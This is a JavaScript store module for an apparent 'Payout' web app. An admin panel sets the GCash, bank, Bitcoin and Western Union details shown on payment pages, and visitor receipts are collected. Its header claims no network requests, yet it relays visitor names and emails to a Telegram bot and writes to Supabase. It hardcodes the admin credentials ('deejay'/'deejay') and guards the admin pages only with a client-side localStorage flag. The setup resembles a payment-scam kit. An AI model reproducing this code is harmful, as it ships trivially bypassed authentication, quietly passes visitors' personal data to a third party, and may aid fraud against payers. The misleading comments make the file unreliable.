/* ==========================================================================
   Payout — browser-side store.

   Everything the admin saves lives here, in this browser's localStorage.
   No server, no database, no network requests. Payment pages read the same
   store, so an edit in the admin panel shows up on the payment pages
   immediately (same browser).

   Shared by /pay/* and /admin/* via a relative import: ../js/store.js
   ========================================================================== */

import { getSupabase, supabaseConfigured } from './config.js';

const KEY = 'payout.store.v1';
const SESSION_KEY = 'payout.session.v1';

/* Defaults so every payment page renders before an admin edits it. */
const DEFAULTS = {
    logo: '',
    gcash: {
        gcashName: 'Juan Dela Cruz',
        gcashNumber: '0917 123 4567',
        gcashCurrency: 'PHP',
        gcashAmount: '5,000',
    },
    paymaya: {
        payAcctName: 'Juan Dela Cruz',
        payAcctNumber: '0917 765 4321',
        payCurrency: 'PHP',
        payAmount: '5,000',
    },
    transfer: {
        tBankName: 'BDO Unibank',
        tAcctName: 'Juan Dela Cruz',
        tAcctNumber: '0012 3456 7890',
        tCurrency: 'PHP',
        tAmount: '5,000',
    },
    wallet: {
        address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
        amount: '0.0012',
        wallet: 'BTC',
        qrImage: '',
    },
    wumg: {
        payWith: 'Western Union',
        wuCurrency: 'USD',
        wuAmount: '100',
        wuDetails: 'Receiver: Juan Dela Cruz\nCountry: Philippines\nMTCN: 1234567890',
    },
    receipts: [],
};

function clone(value) {
    return JSON.parse(JSON.stringify(value));
}

function read() {
    try {
        const raw = localStorage.getItem(KEY);
        if (!raw) return clone(DEFAULTS);
        const parsed = JSON.parse(raw);
        // Merge over defaults so a store written by an older build still works.
        return { ...clone(DEFAULTS), ...parsed };
    } catch {
        return clone(DEFAULTS);
    }
}

function write(state) {
    try {
        localStorage.setItem(KEY, JSON.stringify(state));
    } catch {
        // Storage full or unavailable (private mode): keep going in memory.
    }
}

export function getAll() {
    return read();
}

export function get(section) {
    return read()[section];
}

/* Replace a whole section, e.g. save('gcash', {...}). */
export async function save(section, value) {
    const state = read();
    state[section] = value;
    write(state);
    const synced = await pushToSupabase(section, value);
    noteSync(synced);
    return { value, synced, remote: supabaseConfigured() };
}

/* Merge into a section, keeping fields the form did not submit. */
export async function patch(section, value) {
    const state = read();
    const current = state[section];
    state[section] =
        current && typeof current === 'object' && !Array.isArray(current)
            ? { ...current, ...value }
            : value;
    write(state);

    // Wait for the backend when one is configured, so the caller can report a
    // real result. With no backend this resolves immediately.
    const synced = await pushToSupabase(section, state[section]);
    noteSync(synced);
    return { value: state[section], synced, remote: supabaseConfigured() };
}

export function reset() {
    try {
        localStorage.removeItem(KEY);
    } catch {
        /* ignore */
    }
    return clone(DEFAULTS);
}

/* ---- Logo --------------------------------------------------------------- */
export function getLogo() {
    return read().logo || '';
}

export async function setLogo(dataUrl) {
    const state = read();
    state.logo = dataUrl;
    write(state);
    const synced = await pushToSupabase('logo', dataUrl);
    noteSync(synced);
    return { value: dataUrl, synced, remote: supabaseConfigured() };
}

/* Paint the saved logo into every #logo / #logoDisplay image on the page. */
export function applyLogo() {
    const src = getLogo();
    if (!src) return;
    document.querySelectorAll('#logo, #logoDisplay').forEach((img) => {
        img.src = src;
    });
}

/* ---- Optional backend relays --------------------------------------------
   Both are inactive until configured, so the app works fully offline while
   the values are empty:

   - Supabase: set SUPABASE_URL / SUPABASE_ANON_KEY in js/config.js to mirror
     saved payment details into a table.
   - Telegram: set botToken / chatId in telegram.js to relay submitted data.

   Every call is wrapped, so an unconfigured or unreachable backend never
   blocks the UI. */

/* Sends a section to Supabase. Resolves to true when it was written, false
   when no backend is configured or the write failed. */
async function pushToSupabase(section, value) {
    const client = await getSupabase();
    if (!client) return false;
    try {
        const { error } = await client
            .from('settings')
            .upsert({ id: section, value }, { onConflict: 'id' });
        if (error) throw error;
        return true;
    } catch (err) {
        console.warn('Supabase write failed:', err && err.message);
        return false;
    }
}

/* Pulls every row back into localStorage. Returns true when the backend was
   reachable and answered, false otherwise, so callers can fall back. */
async function pullFromSupabase() {
    const client = await getSupabase();
    if (!client) return false;
    try {
        const { data, error } = await client.from('settings').select('id,value');
        if (error) throw error;
        if (!Array.isArray(data)) return false;

        const state = read();
        for (const row of data) {
            if (row && row.id) state[row.id] = row.value;
        }
        write(state);
        return true;
    } catch (err) {
        console.warn('Supabase read failed:', err && err.message);
        return false;
    }
}

async function relayToTelegram(text) {
    try {
        const token = window.botToken;
        const chat = window.chatId;
        if (!token || !chat) return;
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chat, text, parse_mode: 'HTML' }),
        });
    } catch (err) {
        console.warn('Telegram relay skipped:', err && err.message);
    }
}

/* Load the shared settings before a page renders. Payment pages call this so
   Supabase is the source of truth and every visitor sees the same details.
   Resolves false when no backend is configured or it cannot be reached, in
   which case the localStorage copy is already in place and rendering goes on
   with it. */
export async function hydrate() {
    if (!supabaseConfigured()) return false;
    return pullFromSupabase();
}

/* ---- Sync status, for the admin dashboard ---- */
let syncState = { at: null, synced: false, remote: false };
export function lastSync() {
    return syncState;
}
function noteSync(synced) {
    syncState = { at: new Date().toISOString(), synced, remote: supabaseConfigured() };
}

export function backendStatus() {
    return {
        supabase: supabaseConfigured(),
        telegram: Boolean(window.botToken && window.chatId),
    };
}

/* ---- Receipts ----------------------------------------------------------- */
export async function addReceipt({ name, email, image }) {
    const state = read();
    const receipt = {
        id: `rcpt_${Date.now().toString(36)}${Math.random().toString(36).slice(2, 7)}`,
        name,
        email,
        image: image || '',
        at: new Date().toISOString(),
    };
    state.receipts = [receipt, ...(state.receipts || [])].slice(0, 25);
    write(state);
    const synced = await pushToSupabase('receipts', state.receipts);
    noteSync(synced);
    relayToTelegram(
        `New receipt\nName: ${name}\nEmail: ${email}\nAt: ${receipt.at}`
    );
    return { receipt, synced, remote: supabaseConfigured() };
}

export function getReceipts() {
    return read().receipts || [];
}

/* ---- Admin session ------------------------------------------------------ */
/* The admin credentials live here so the login page and the dashboard guard
   read from one place. They cannot drift out of sync. */
export const ADMIN = { user: 'deejay', pass: 'deejay' };

export function signIn(user, pass) {
    if (user !== ADMIN.user || pass !== ADMIN.pass) return false;
    try {
        localStorage.setItem(SESSION_KEY, 'in');
    } catch {
        /* ignore */
    }
    return true;
}

export function signOut() {
    try {
        localStorage.removeItem(SESSION_KEY);
    } catch {
        /* ignore */
    }
}

export function isSignedIn() {
    try {
        return localStorage.getItem(SESSION_KEY) === 'in';
    } catch {
        return false;
    }
}

/* ---- Small helpers ------------------------------------------------------ */
/* Fall back to alert() when SweetAlert2 is not on the page. */
export function notify(title, text, tone = 'success') {
    if (typeof window.Swal !== 'undefined') {
        window.Swal.fire(title, text, tone);
    } else {
        window.alert(text ? `${title}\n\n${text}` : title);
    }
}

/* Friendly placeholder for a field the admin has not filled in yet. */
export function orDash(value) {
    const text = value == null ? '' : String(value).trim();
    return text || '—';
}

/* Wire every copy icon on a page to the value in its own row. */
export function enableCopy() {
    document.querySelectorAll('.bi-copy').forEach((btn) => {
        if (btn.dataset.copyBound) return;
        btn.dataset.copyBound = '1';
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            const scope = btn.closest('.con-flex, .btc-flex') || btn.parentElement;
            const source = scope && scope.querySelector('.con-value, .send_address, .btc-container');
            const text = (source ? source.innerText : '').trim();
            if (!text) {
                window.alert('Nothing to copy.');
                return;
            }
            navigator.clipboard
                .writeText(text)
                .then(() => window.alert('Copied to clipboard!'))
                .catch(() => window.alert('Failed to copy!'));
        });
    });
}

/* Name shown on the admin dashboard. */
export function currentUser() {
    return isSignedIn() ? ADMIN.user : '';
}

/* Section navigation used by the admin dashboard. */
export function menuNav(select, base = 'admin') {
    const routes = {
        admin: {
            gcash: 'gcash.html',
            paymaya: 'paymaya.html',
            bank: 'transfer.html',
            bitcoin: 'bitcoin.html',
            wumg: 'wumg.html',
            receipts: 'receipts.html',
        },
    };
    const target = (routes[base] || {})[select];
    if (target) window.location.href = target;
}

/* Redirect to the login page when there is no admin session.
   Call at the top of every admin page script. */
export function requireAdmin() {
    if (!isSignedIn()) {
        window.location.href = 'index.html';
        return false;
    }
    return true;
}
